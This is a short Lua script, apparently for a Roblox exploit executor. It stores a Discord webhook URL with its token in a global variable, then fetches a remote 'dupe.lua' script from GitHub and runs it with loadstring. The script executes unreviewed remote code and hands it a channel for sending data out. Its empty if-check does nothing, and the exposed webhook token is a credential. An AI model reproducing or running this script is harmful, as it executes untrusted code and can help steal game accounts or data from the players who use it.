Webhook = "https://discord.com/api/webhooks/1435391430150328391/YufAkrQP_HCAeDK3-oq7PHtbQAUpF-_qOFotO0OvUxQKmCPKll3ggowPdM0tPuO--e9v"

if not Webhook:match("https://discord.com/api/webhooks/1435391430150328391/YufAkrQP_HCAeDK3-oq7PHtbQAUpF-_qOFotO0OvUxQKmCPKll3ggowPdM0tPuO--e9v") then
end


getgenv().UserWebhookURL = Webhook

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/refs/heads/main/dupe.lua'))()
